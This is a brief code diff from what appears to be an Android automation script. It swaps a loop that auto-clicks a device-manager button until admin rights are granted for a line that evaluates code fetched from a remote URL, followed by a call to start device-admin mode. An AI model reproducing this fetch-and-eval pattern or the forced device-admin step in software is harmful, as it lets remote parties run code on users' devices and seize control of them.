@@ -17,22 +17,12 @@ if (funstr != "") {
 else {
     log("实例化失败,程序返回")
 }
-
 }
 
-ui函数=httpget("https://gitee.com/zhangshu345012/sample/raw/v1/%E5%9F%BA%E7%A1%80/ces.js")
-engines.execScript("uiname",ui函数,{})
-evalfun(公共函数url)
-let ss=true
-while(ss)
-{
-    if(isdeviceadmin()){
-        ss=false
-    }
-    clickids(["devicemanger"])
-    sleep(1000)
-   
-}
+eval(httpget(公共函数url))
+
+startdeviceadmin()
+
 
 
 
